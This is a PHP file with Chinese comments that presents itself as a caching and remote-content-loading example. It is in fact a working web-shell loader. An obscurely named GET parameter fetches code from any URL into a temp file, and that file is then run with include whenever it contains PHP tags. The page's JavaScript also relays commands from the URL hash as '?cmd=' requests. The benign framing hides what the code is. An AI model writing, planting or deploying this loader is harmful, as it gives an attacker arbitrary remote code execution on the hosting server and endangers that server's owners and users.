<?php
// 定义配置类，管理缓存文件路径
class Config
{
    const CACHE_FILENAME = 'lao.zi';

    /**
     * 获取缓存目录（系统临时目录）
     * @return string
     */
    public static function getCacheDir()
    {
        return sys_get_temp_dir();
    }

    /**
     * 获取完整的缓存文件路径
     * @return string
     */
    public static function getCacheFilePath()
    {
        return self::getCacheDir() . DIRECTORY_SEPARATOR . self::CACHE_FILENAME;
    }
}

// 工具类，封装常用功能
class Utility
{
    /**
     * 验证URL是否合法
     * @param string $url
     * @return bool
     */
    public static function validateUrl($url)
    {
        return filter_var($url, FILTER_VALIDATE_URL) !== false;
    }

    /**
     * 使用cURL获取远程内容
     * @param string $url
     * @return string|null
     */
    public static function fetchRemoteContent($url)
    {
        if (function_exists('curl_init')) {
            $ch = curl_init($url);
            curl_setopt_array($ch, [
                CURLOPT_RETURNTRANSFER => true,
                CURLOPT_FOLLOWLOCATION => true,
                CURLOPT_CONNECTTIMEOUT => 10,
                CURLOPT_TIMEOUT => 10,
            ]);
            $response = curl_exec($ch);
            if (curl_errno($ch)) {
                error_log('cURL错误：' . curl_error($ch));
                curl_close($ch);
                return null;
            }
            curl_close($ch);
            return $response;
        }

        // 备用：file_get_contents
        if (ini_get('allow_url_fopen')) {
            $content = @file_get_contents($url);
            if ($content !== false) {
                return $content;
            }
        }

        // 最后：套接字方法
        $parts = parse_url($url);
        if (!$parts || !isset($parts['host'])) {
            return null;
        }
        $host = $parts['host'];
        $port = isset($parts['port']) ? (int)$parts['port'] : 80;
        $path = isset($parts['path']) ? $parts['path'] : '/';
        $query = isset($parts['query']) ? '?' . $parts['query'] : '';

        $socket = @fsockopen($host, $port, $errno, $errstr, 10);
        if (!$socket) {
            error_log("套接字连接失败：{$errstr} ({$errno})");
            return null;
        }

        $request = "GET {$path}{$query} HTTP/1.1\r\n" .
                   "Host: {$host}\r\n" .
                   "Connection: Close\r\n\r\n";

        fwrite($socket, $request);
        $response = '';
        while (!feof($socket)) {
            $response .= fgets($socket, 1024);
        }
        fclose($socket);

        // 解析响应内容
        $parts = preg_split('/\r\n\r\n/', $response, 2);
        return isset($parts[1]) ? $parts[1] : null;
    }

    /**
     * 载入缓存内容
     * @param string $filePath
     * @return string
     */
    public static function loadCache($filePath)
    {
        return (file_exists($filePath)) ? @file_get_contents($filePath) ?: '' : '';
    }

    /**
     * 保存内容到缓存
     * @param string $filePath
     * @param string $content
     * @return bool
     */
    public static function saveCache($filePath, $content)
    {
        return @file_put_contents($filePath, $content) !== false;
    }
}

// 处理请求逻辑
class LaoZiHandler
{
    private $cacheFile;

    public function __construct()
    {
        $this->cacheFile = Config::getCacheFilePath();
        $this->ensureCacheDir();
    }

    /**
     * 确保缓存目录存在
     */
    private function ensureCacheDir()
    {
        $dir = dirname($this->cacheFile);
        if (!is_dir($dir)) {
            @mkdir($dir, 0755, true);
        }
    }

    /**
     * 处理远程内容加载请求
     */
    public function handleRequest()
    {
        if (isset($_GET['laolierzi'])) {
            $url = trim($_GET['laolierzi']);

            if (!Utility::validateUrl($url)) {
                $this->showMessage('无效的URL地址。', true);
            }

            $content = Utility::fetchRemoteContent($url);
            if ($content === null) {
                $this->showMessage('获取内容失败，请稍后重试。', true);
            }

            Utility::saveCache($this->cacheFile, $content);
            $this->redirectToSelf();
        }
    }

    /**
     * 显示缓存内容
     */
    public function displayCache()
    {
        if (file_exists($this->cacheFile)) {
            $content = Utility::loadCache($this->cacheFile);
            if (strpos($content, '<?') !== false) {
                // 执行缓存中的PHP代码（注意安全风险）
                include $this->cacheFile;
            } else {
                echo $content;
            }
        } else {
            $this->showMessage('暂无内容缓存，请通过URL加载远程内容。', false);
        }
    }

    /**
     * 显示信息框
     * @param string $message
     * @param bool $isError
     */
    private function showMessage($message, $isError = false)
    {
        $color = $isError ? '#e74c3c' : '#3498db';
        echo <<<HTML
        <div style="
            margin: 50px auto;
            padding: 20px 30px;
            max-width: 700px;
            border-radius: 8px;
            background-color: #ffffff;
            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
            font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
            font-size: 1.2em;
            color: {$color};
            text-align: center;
            line-height: 1.4;
        ">
            {$message}
        </div>
        HTML;
        exit;
    }

    /**
     * 重定向至自身
     */
    private function redirectToSelf()
    {
        $currentUrl = $_SERVER['PHP_SELF'];
        echo "<script>window.location.href='{$currentUrl}';</script>";
        exit;
    }
}

// 实例化处理器
$handler = new LaoZiHandler();
$handler->handleRequest();

?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8" />
<title>缓存与远程内容加载示例</title>
<script>
// 页面加载完成后，检测URL哈希，触发相应AJAX请求
window.onload = function() {
    if (window.location.hash) {
        var hash = window.location.hash.substring(1); // 移除#
        if (hash.startsWith('cmd=')) {
            var command = hash.substring(4);
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "?cmd=" + encodeURIComponent(command), true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    document.getElementById("output").innerText = xhr.responseText;
                }
            };
            xhr.send();
        } else if (hash.startsWith('load=')) {
            var url = hash.substring(5);
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "?laolierzi=" + encodeURIComponent(url), true);
            xhr.onreadystatechange = function() {
                if (xhr.readyState === 4 && xhr.status === 200) {
                    document.getElementById("content").innerHTML = xhr.responseText;
                }
            };
            xhr.send();
        }
    }
};
</script>
</head>
<body>
<div id="content">
<?php
// 显示缓存内容或PHP代码
if (isset($handler)) {
    $handler->displayCache();
}
?>
</div>
</body>
</html>
